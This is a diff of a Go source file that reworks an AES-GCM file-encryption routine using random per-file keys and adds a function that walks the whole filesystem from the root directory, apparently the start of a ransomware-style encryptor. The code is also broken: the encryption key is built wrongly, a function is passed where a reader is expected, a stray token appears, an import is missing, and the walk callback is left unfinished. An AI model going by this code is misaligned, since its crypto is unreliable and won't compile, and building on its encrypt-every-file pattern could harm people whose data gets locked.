@@ -2,13 +2,15 @@ package symmetric
 
 import (
 	"crypto/aes"
+	"path/filepath"
 	"crypto/cipher"
 	"crypto/rand"
 	"fmt"
 	"io"
 )
 
-// Generates ranndom key used to encrypt each file
+/* keyGen function generates random 32 byte 
+   key for each file that is encrypted */
 func keyGen() *[]byte {
 	key := make([]byte, 32)
 	_, err := rand.Read(key)
@@ -18,30 +20,36 @@ func keyGen() *[]byte {
 	return &key
 }
 
-// Encrypt func encrypts files using our random key and file.
-// the result will be an AES cipher block
+/* Encrypt func encrypts files using our random key and file.
+   the result will be an AES cipher block */
 func encrypt(data []byte, key []byte) (*[]byte, error) {
-	cipherBlock, err := aes.NewCipher(key)
+	cipherBlock, err := aes.NewCipher(keyGen())
 	if err != nil {
 		return nil, err
 	}
-	// Galois Counter Mode being applied to AES cipher block.
+	/* Galois Counter Mode being applied to AES cipher block.
+	   GCM also adds authentication to ensure encrypted data 
+	   is not tampered with.*/
 	gcm, err := cipher.NewGCM(cipherBlock)
 	if err != nil {
 		return nil, err
 	}
-	// Number used once
+	// NONCE/IV initialization.
 	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+	if _, err := io.ReadFull(rand.Read, nonce); err != nil {
 		return nil, err
 	}
-
+    // Cipher text with nonce applied
 	cipherText := gcm.Seal(nonce, nonce, data, nil)
 	return &cipherText, nil
 
 }
 
-func encryptFile(filepath string, key []byte) (*[]byte, error) {
-	fmt.Println("test")
-
+func encryptFile(path string, key []byte) (*[]byte, error) {
+	fi
+       err := filepath.Walk("/", func(path string, info os.FileInfo, err error) error {
+		   if err != nil {
+			   fmt.Println(err)
+		   }
+	   }
 }
